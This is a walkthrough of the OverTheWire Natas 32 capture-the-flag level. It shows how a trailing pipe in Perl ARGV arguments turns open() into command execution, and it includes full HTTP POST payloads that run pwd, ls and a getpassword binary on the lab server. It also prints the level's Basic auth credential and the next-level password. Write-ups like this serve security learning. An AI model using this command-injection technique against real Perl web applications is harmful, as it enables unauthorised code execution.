This challenge is very similar to the previous one, but instead of reading arbitrary files we need to execute arbitrary code.

The [presentation](https://www.blackhat.com/docs/asia-16/materials/asia-16-Rubin-The-Perl-Jam-2-The-Camel-Strikes-Back.pdf) I mentioned in the previous challenge also says we can execute arbitrary code by appending a `|` at the end of the script arguments. In that case `open()` executes the string instead of opening the file.

So we can just copy/paste the previous challenge solution and tweak it a bit:
```
POST /index.pl?pwd%20| HTTP/1.1 # tells us webroot is /var/www/natas/natas32
POST /index.pl?ls%20/var/www/natas/natas32%20| HTTP/1.1 # tells us there is getpassword binary in the webroot
```

**Note:** somehow a space is needed before the `|` character, don't know why

Then we just run getpassword:
```
POST /index.pl?./getpassword%20| HTTP/1.1
Host: natas32.natas.labs.overthewire.org
Content-Length: 385
Cache-Control: max-age=0
Authorization: Basic bmF0YXMzMjpZcDVmZnlmbUVkanZUT3dwTjVIQ3ZoN0N0Z2Y5ZW0zRw==
Upgrade-Insecure-Requests: 1
Origin: http://natas32.natas.labs.overthewire.org
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryrRziB0OAft3LhW83
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.5195.102 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://natas32.natas.labs.overthewire.org/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close

------WebKitFormBoundaryrRziB0OAft3LhW83
Content-Disposition: form-data; name="file"

ARGV
------WebKitFormBoundaryrRziB0OAft3LhW83
Content-Disposition: form-data; name="file"; filename="test.csv"
Content-Type: text/csv

foo,bar
1,2
------WebKitFormBoundaryrRziB0OAft3LhW83
Content-Disposition: form-data; name="submit"

Upload
------WebKitFormBoundaryrRziB0OAft3LhW83--
```

Password for the next level is `2v9nDlbSF7jvawaCncr5Z9kSzkmBeoCJ`.
